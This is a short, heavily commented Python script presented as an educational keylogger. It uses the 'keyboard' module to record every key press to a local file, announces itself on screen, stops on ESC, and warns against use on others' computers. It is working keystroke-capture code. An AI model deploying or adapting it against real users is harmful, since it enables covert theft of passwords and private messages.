# ============================================
# SIMPLE KEYLOGGER FOR EDUCATIONAL PURPOSES
# ============================================
# WHAT THIS DOES:
# Records every key you press on your keyboard and saves it to a file
# USE ONLY ON YOUR OWN COMPUTER FOR LEARNING

import keyboard  # Module to listen to keyboard events (needs installation)
import datetime  # Module to work with date and time

# File where keystrokes will be saved
log_file = "keylog.txt"

# This function runs every time a key is pressed
def on_key_press(event):
    # 'event' contains information about which key was pressed
    
    # Open file in append mode ('a') - adds new text without deleting old content
    with open(log_file, 'a', encoding='utf-8') as f:
        
        # Check which key was pressed and write appropriate text
        if event.name == 'space':
            f.write(' ')  # Space key -> write a space
        
        elif event.name == 'enter':
            f.write('\n')  # Enter key -> start new line
        
        elif event.name == 'backspace':
            f.write('[BACKSPACE]')  # Backspace key -> mark it with a tag
        
        elif event.name == 'tab':
            f.write('[TAB]')  # Tab key -> mark it with a tag
        
        elif len(event.name) == 1:
            # If the key name is a single character (letter, number, symbol)
            f.write(event.name)  # Write that character directly
        
        else:
            # For other special keys (shift, ctrl, alt, arrow keys, etc.)
            f.write(f'[{event.name}]')  # Write the key name inside brackets

# ========== MAIN PROGRAM ==========
print("=" * 50)
print("KEYLOGGER STARTED - EDUCATIONAL MODE")
print("=" * 50)
print(f"Log file: {log_file}")
print("Every key you press will be recorded.")
print("Press 'ESC' key to stop the program.")
print("=" * 50)

# Tell keyboard module to call on_key_press() whenever any key is pressed
keyboard.on_press(on_key_press)

# Wait until the user presses the 'esc' key
# The program stays running and listening until this happens
keyboard.wait('esc')

# This line runs only after ESC is pressed
print("\n" + "=" * 50)
print("KEYLOGGER STOPPED")
print(f"Check the file '{log_file}' to see recorded keystrokes.")
print("=" * 50)

# ============================================
# HOW TO INSTALL THE REQUIRED MODULE:
# Run this command in terminal/command prompt:
# pip install keyboard
# 
# HOW TO RUN THE PROGRAM:
# python keylogger.py
# 
# WARNING - READ THIS:
# This program is for EDUCATIONAL PURPOSES only
# Using this on someone else's computer without permission is ILLEGAL
# Only use it on your OWN computer to learn how keyloggers work
# ============================================
